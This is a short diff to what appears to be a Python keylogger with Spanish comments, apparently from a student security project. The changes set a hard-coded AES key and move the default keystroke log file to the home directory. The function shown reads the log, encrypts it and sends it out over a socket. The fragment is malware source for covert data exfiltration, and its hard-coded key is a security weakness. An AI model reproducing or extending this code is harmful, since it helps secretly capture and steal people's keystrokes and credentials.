@@ -45,7 +45,7 @@ def enviarMensaje():
     # abre archivo log
     file = open(archivoLog, "r")
     # transforma el dict que resultado de la encriptación con AES-256, a json y el json a str,
-    mensajeEncriptado = json.dumps(encriptar(file.read(), "hola")).encode()
+    mensajeEncriptado = json.dumps(encriptar(file.read(), "ProyectoSeguridad")).encode()
     # Envia el mensaje encriptado a traves del socket
     sock.sendall(mensajeEncriptado)
     # cierra el archivo log
@@ -81,7 +81,7 @@ def encriptar(mensaje, clave):
 # Indica el directorio del archivo log
 archivoLog = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('~/Desktop/file.log')
+    os.path.expanduser('~/file.log')
 )
 
 
